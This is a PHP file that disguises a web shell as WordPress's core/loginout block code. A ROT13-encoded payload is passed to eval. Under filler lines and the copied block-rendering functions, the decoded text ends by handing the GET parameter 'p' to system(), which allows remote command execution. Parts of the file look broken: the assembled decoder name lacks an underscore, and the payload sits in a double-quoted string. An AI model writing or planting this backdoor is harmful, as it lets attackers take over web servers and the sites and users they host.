<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/ybtvabhg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/ybtvabhg` oybpx ba freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur ybtva-bhg yvax be sbez.
 */
shapgvba eraqre_oybpx_pber_ybtvabhg( $nggevohgrf ) {

	// Ohvyq gur erqverpg HEY.
	$pheerag_hey = ( vf_ffy() ? 'uggcf://' : 'uggc://' ) . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'];

	$pynffrf  = vf_hfre_ybttrq_va() ? 'ybttrq-va' : 'ybttrq-bhg';
	$pbagragf = jc_ybtvabhg(
		vffrg( $nggevohgrf['erqverpgGbPheerag'] ) && $nggevohgrf['erqverpgGbPheerag'] ? $pheerag_hey : '',
		snyfr
	);

	// Vs ybttrq-bhg naq qvfcynlYbtvaNfSbez vf gehr, fubj gur ybtva sbez.
	vs ( ! vf_hfre_ybttrq_va() && ! rzcgl( $nggevohgrf['qvfcynlYbtvaNfSbez'] ) ) {
		// Nqq n pynff.
		$pynffrf .= ' unf-ybtva-sbez';

		// Trg gur sbez.
		$pbagragf = jc_ybtva_sbez( neenl( 'rpub' => snyfr ) );
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $pynffrf ) );

	erghea '<qvi ' . $jenccre_nggevohgrf . '>' . $pbagragf . '</qvi>';
}

/**
 * Ertvfgref gur `pber/ybtvabhg` oybpx ba freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_ybtvabhg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/ybtvabhg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_ybtvabhg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_ybtvabhg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>